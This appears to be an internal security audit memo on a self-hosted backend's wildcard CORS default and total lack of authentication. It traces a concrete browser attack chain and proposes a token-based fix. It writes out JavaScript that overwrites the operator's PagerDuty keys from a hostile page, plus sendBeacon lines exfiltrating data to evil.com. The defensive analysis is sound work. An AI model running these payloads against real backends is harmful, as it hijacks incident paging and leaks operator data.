# INFRA WORKER 2 — Static-frontend/real-backend split + CORS/beacon exfiltration

## A. Current state of our code (verified from the artifact, branch `lane/domain-research-infra` @ 8c0893b)

**CORS (`platform/server/app.py`, lines ~73–135).**
- Default `cors_origins="*"`: every `/api/*` response carries `Access-Control-Allow-Origin: *`, injected via a wrapped `start_response` so all handlers comply. OPTIONS preflight on `/api/*` returns 204 with `Access-Control-Allow-Methods: GET, POST, DELETE, OPTIONS`, `Access-Control-Allow-Headers: Content-Type, Authorization`, `Access-Control-Max-Age: 600`. The preflight handler does not check the Origin at all — it answers any origin, any time, even under `*`.
- `--cors-origins` allowlist mode: echoes back only listed origins with `Vary: Origin` (correct header behavior).
- Empty string disables CORS headers entirely ("proxy owns the policy").
- Code comment openly states: `"*" (default) keeps the one-command self-host path working; restrict it to your console origin(s) with --cors-origins in production.`

**Integrations/auth state (the earlier "unauthenticated KEYS surface" question).**
- Grepped the whole server for auth: **there is zero authentication anywhere.** No 401/403, no API key, no token, no `Authorization` check, no session. The "BYOK integrations" surface (`/api/v1/integrations/status` GET, `/api/v1/integrations/keys` POST, `/api/v1/integrations/keys/<name>` DELETE, `/api/v1/integrations/simulated` POST, `/api/v1/integrations/test-page` POST) is completely open to anyone who can reach the backend.
- One honest mitigation is real: `integrations.py` `status()` reports only `configured`/`last4` — key **values are never readable back** through the API. But writing/overwriting/deleting keys needs no credential, so the "write-only" property does not protect anything.
- Also `/api/simulate` POST is an unauthenticated write surface (drives simulator scenarios).
- `test-page` (line ~452): reads `self.integrations.get(PD_KEY_NAME)` and can page PagerDuty with the stored routing key — so the unauthenticated POST can *spend* the operator's key. It does not return the key value, but it does disclose `source: "stored"` vs `"env"`.

---

## TOPIC 3 — Static-console + real-backend splits

### OUR STATE
- GitHub Pages serves `/` (prod console, zero fixtures, talks to operator's self-hosted backend cross-origin) and `/staging/` (pre-rendered JSON, never touches a backend). Prod console needs the backend to be CORS-open to a Pages origin (`adityapagare619.github.io`).
- No auth between console and backend. Trust model is implicitly "the backend only listens on the operator's LAN/laptop, so reachability ≈ authorization."

### REAL WORLD (sourced)
1. **CORS done correctly = exact-origin allowlist, never `*` in production.** The Fetch spec forbids `*` combined with credentials: a credentialed request with `Access-Control-Allow-Origin: *` fails at the browser before the response is exposed — specified since 2014, implemented in all current browsers (dev.to analysis of WHATWG Fetch §3.2.3; MDN's "Credentialed requests and wildcards"). Real starter kits ship fail-closed: "do not open `*` with credentials" (b2b-saas-starter-kit auth docs).
   - https://dev.to/rxkov/cors-misconfiguration-in-apis-why-reflected-origin-plus-credentials-is-the-dangerous-pattern-not-5ip
   - https://github.com/vladimirghrejyan/b2b-saas-starter-kit/blob/HEAD/docs/guides/authentication-and-authorization.md
2. **Preflight caching is standard practice** (`Access-Control-Max-Age`, commonly 600–86400s). We already send 600, which matches the low end of normal.
   - https://github.com/rakshyak-98/back2basics/blob/HEAD/Security/CORS%20(Cross%20Origin%20Request%20Sharing).md
3. **How real products authenticate a static SPA to a self-hosted backend.** Three patterns dominate:
   - **Same-origin reverse proxy (the Grafana pattern).** Grafana's frontend is static but *served by the backend itself*; it does not support CORS at all — the documented fix for cross-origin embedding is a same-origin proxy that calls Grafana server-side with an API key.
   - https://github.com/dmzubr/grafana-web-proxy/blob/master/readme.md
   - https://github.com/denisgulev/gitops-playground (CloudFront: `/api/*` → EC2, `/*` → S3)
   - **Bearer token in `Authorization` header (the cross-origin SPA pattern).** The SPA holds a short-lived token (memory, not localStorage) and sends `Authorization: Bearer <token>`; no cookies, no CSRF problem. Standard for "fully decoupled frontend/backend".
   - https://dev.to/devtanmay/cookie-auth-vs-bearer-token-in-express-what-s-the-difference-and-when-to-use-each-4ieh
   - **BFF (backend-for-frontend) cookie sessions.** Browser keeps an `HttpOnly; Secure; SameSite=Lax` session cookie; the BFF talks to the API. Cross-origin needs `SameSite=None; Secure`, explicit `credentials: 'include'`, exact-origin ACAO, *plus* synchronizer CSRF tokens on unsafe methods.
   - https://github.com/jakobpriesner/culina/blob/HEAD/.claude/skills/cookie-auth-and-security/SKILL.md
   - https://github.com/ice-962464/codex-skill-library/blob/HEAD/browser-storage-security/SKILL.md
4. **Environment separation.** One backend per frontend environment with scoped CORS each way: Vercel/Netlify preview deploys per PR with per-deploy origin allowlists; the demo-sensor-app architecture bakes absolute API URLs at build time and scopes the backend's `CORS_ORIGINS` to the frontend's URL. Supabase/Clerk split staging/prod as separate projects/tenants. Principle: **the frontend's origin is a build-time constant per environment, and the backend allowlists exactly that origin.**
   - https://github.com/braboj/demo-sensor-app/blob/HEAD/docs/arc42/07-deployment-view.md
   - https://github.com/pratikshaprabhakarbande/ai-powered-multi-cloud-portability-and-deployment-automation-platform/blob/HEAD/docs/09-deployment-guide.md ("explicit non-wildcard `CORS_ORIGIN`... The backend refuses to start otherwise")

### GAP
- Our `*` default makes every backend on earth CORS-readable/writable by every website on earth. The honest defense (read data is non-secret observability data) collapses on the write surfaces: **any website the operator visits can POST to `http://localhost:<port>/api/v1/integrations/keys`** from JS (preflight passes under `*`), overwrite the operator's PagerDuty routing key and Jev API key with the attacker's values. This is concrete CSRF-by-CORS.
- We have no auth story between console and backend at all — tightening CORS is necessary but insufficient. The real world pairs exact-origin CORS *with* one of the three auth patterns above; we have neither.
- Environment separation is accidental: staging never touches a backend (good), but prod console's backend URL is operator-typed at runtime, and the backend's CORS default says "yes" to everything — no binding between a specific console deployment and a specific backend instance.

### FIX DIRECTION (all ₹0)
1. **Flip the default.** Make `--cors-origins` default to `https://adityapagare619.github.io` (the Pages prod console) instead of `*`, keeping `*` as an explicit opt-in behind `SENTINEL_CORS_INSECURE=1` so it can't happen silently.
2. **Add the missing REAL boundary: a per-install operator token.** At first startup the server generates a random token, prints it once, stores it in the integrations dir; the console's backend-URL setup screen asks for it once and stores it in localStorage; every API request carries `Authorization: Bearer <token>` (preflight already allows that header). Standard decoupled-SPA pattern, ₹0.
3. **Same-origin option for the careful operator:** document serving the static prod console from the backend's own `ui_dir` (code already supports it) — zero CORS, zero extra config — as the recommended local path; keep Pages only for the hosted-console case.

---

## TOPIC 4 — Beacon exfiltration via CORS (the actual attack mechanics)

### The mechanics, precisely (sourced)
- **CORS decides *read*, not *send*.** The browser sends the request anyway; CORS decides whether the calling script may see the response. CSRF is about an action that happens because the request was *sent*; CORS is about *reading* the response. (cert-study notes; dev.to XSRF explainer)
  - https://github.com/jondmarien/cert-study/blob/HEAD/content/bscp/cors.mdx
  - https://Dev.To/saurabh_raj_afaabe1844a4c/understanding-xsrf-protection-in-fetch-vs-axios-14hk
- **`fetch`/`XHR` in CORS mode**: with our `ACAO: *`, any site's `fetch('http://backend/api/decisions')` **reads the full response body** — no preflight needed for simple GETs. `*` permits reads *without* credentials (WHATWG Fetch §3.2.3: `*` + credentials flag active = network error, all browsers since 2014).
  - https://dev.to/rxkov/cors-misconfiguration-in-apis-why-reflected-origin-plus-credentials-is-the-dangerous-pattern-not-5ip
- **`fetch(mode:'no-cors')`, `<img>`, `<script>`**: request sent, response **opaque** — attacker learns nothing except coarse side channels (onload/onerror; timing). Useful for existence/state oracles (XS-Leaks), not data theft.
  - https://github.com/lu1sdv/skillsmd/blob/HEAD/vuln-research/references/browser-attacks.md
- **`navigator.sendBeacon`**: fires an async HTTP POST (no response read — "does not require a response", MDN); it's the *exfiltration leg*: after `fetch()` reads our API data (allowed by `ACAO: *`), the attacker's script does `navigator.sendBeacon('https://evil.com/collect', stolenJSON)` to smuggle data off the victim's browser reliably, even as the page unloads.
  - https://github.com/mdn/content/blob/main/files/en-us/web/api/navigator/sendbeacon/index.md
- **The dangerous pattern is NOT `*`.** `ACAO: *` without credentials cannot steal authenticated data in any browser. The dangerous pattern is **origin reflection + `Access-Control-Allow-Credentials: true`** (PortSwigger's classic lab). We don't reflect origins and don't set `ACAC: true`, so we don't have *that* bug.
  - https://portswigger.net/web-security/cors
  - https://medium.com/@bhanvararamchoudhary6/exploiting-cors-misconfigurations-complete-walkthrough-of-3-portswigger-labs-bb0c72a29f4c
- **The "wildcard-with-credentials" footnote**: `ACAO: *` + `ACAC: true` fails in the browser, but the request still *reached the server* — a server that acts on auth before validating CORS still leaks to non-browser clients. Structural lesson for us: **our endpoints act on unauthenticated requests regardless of CORS, so CORS is no barrier at all** (curl/Burp never cared).
  - https://dev.to/rxkov/working-cors-misconfigurations-escape-automated-detection-2a8l

### The concrete attack chain against OUR backend
Assumptions: operator runs the platform server on `http://localhost:8080` (or a LAN IP), has the prod console open against it, clicks a link to the attacker's page (or a malicious ad in another tab). Attacker knows the backend port/URL.

1. **Recon (read, no preflight needed).** On `https://evil.com`:
   ```js
   const d = await (await fetch('http://localhost:8080/api/v1/integrations/status')).json();
   ```
   `ACAO: *` → browser hands the attacker `{"integrations": {"pagerduty_routing_key": {"configured": true, "last4": "…"}, ...}}`. The attacker learns: keys exist, which providers, operator runs Sentinel. Values are write-only (verified) — nothing secret leaks beyond that.
2. **The payload (write; preflight passes under `*`).** Attacker's page sends:
   ```js
   await fetch('http://localhost:8080/api/v1/integrations/keys', {
     method: 'POST', headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({pagerduty_routing_key: 'ATTACKER-PD-KEY', jev_api_key: 'ATTACKER-JEV-KEY'})
   });
   ```
   OPTIONS preflight → **our preflight handler answers every origin with `ACAO: *`** → preflight passes → POST executes → **operator's PagerDuty routing key is now the attacker's**. Subsequent pages from the real console now page *the attacker*, and the operator's incident paging is silently hijacked. No auth required anywhere — CORS was never the only hole; there is no auth *behind* it.
3. **Exfiltration leg.** Same page: `navigator.sendBeacon('https://evil.com/log', JSON.stringify({status: d, host: location.href}))` — reliably smuggles the recon data out even as the operator closes the tab.
4. **What the attacker cannot do**: read key values (write-only API), steal a session (none exists), use credentials-based reflection attacks (no ACAC/reflection). Non-browser clients (curl, rogue local process) never needed CORS — "CORS is not server access control": *our API is unauthenticated; any local process can already do all of this.*

### The "CORS is a placebo" critique — and what the REAL boundary is
- **CORS is browser-side read policy, not an auth boundary.** "If your server relies on CORS to restrict access, an attacker does not need to bypass anything. They just run their script outside a browser." (dev.to CORS piece)
- Our current `*` default is the placebo *inverted*: not that CORS fails to protect us — we have nothing behind it to protect. Tightening CORS alone blocks the *browser-based* attack chain above (step 2's preflight would fail from `evil.com`), which is genuinely valuable because the operator's *browser* is the most likely attack vector. But it does not fix non-browser access.
- **The real boundary must be: a credential on every request.** Correct ₹0 boundary: per-install operator Bearer <redacted> (Topic 3, fix #2) — server rejects requests without it (401), full stop. CORS policy becomes defense-in-depth about *whose browser* may ask, while the token decides *who gets an answer*. With that: ACAO allowlist blocks foreign browsers from even asking with the token (they don't have it — and `ACAC` stays off so ambient cookies never become a confused deputy), and `fetch(no-cors)`/`<img>`/beacon writes hit 401 without the `Authorization` header.

### FIX DIRECTION (₹0, operator-friendly)
1. **Exact-origin allowlist, defaulting to the Pages console; `*` behind an explicit insecure flag.** Kill the universal preflight: OPTIONS must echo `Vary: Origin` and only approve listed origins — the current preflight ignores Origin entirely even in allowlist mode (always returns 204 with allow-methods/headers); that's a real code bug worth fixing in the same change.
2. **Operator Bearer <redacted> on every `/api/*` request** (401 without it), generated at first run, entered once in the console's backend setup. The real boundary; CORS is the outer fence.
3. **Keep `Access-Control-Max-Age: 600`** — already in the sane range; no change needed.
4. **CSRF-style hygiene as belt-and-braces**: require `Content-Type: application/json` on POSTs — simple-form POSTs can't set that header, so they get 422; consider `Origin`/`Referer` check on unsafe methods once the allowlist exists.
5. **Do not add `Access-Control-Allow-Credentials: true` ever** — we don't use cookies, and the spec forbids it with `*`. If cookie auth is ever introduced, it comes *with* the exact-origin allowlist, never before.

### Honest gaps (couldn't verify)
- Whether Chrome's private-network-access preflight (public→private requests) would blunt the localhost attack chain in practice — browser-specific, not a defense to rely on; not tested.
- Whether the prod console actually sends `Authorization` today (preflight allows it, but nothing uses it — presumably placeholder for future auth).
- The staging/prod split's backend-URL mechanism: read `build-static.py`'s docstring (prod = live data, real backend, KEYS functional) but didn't trace how the prod console obtains/stores the backend URL — the token-storage recommendation assumes localStorage, needs confirmation.

**Net verdict:** default-`*` is not "defensible convenience" — it's a real hole, not because `*` is the most dangerous CORS pattern (it isn't; reflected-origin+credentials is), but because it combines with **zero authentication** to let any website the operator visits read operator state and *rewrite their paging keys*. The fix is two layers at ₹0: exact-origin default (fence) + per-install Bearer <redacted> on every request (the actual boundary).
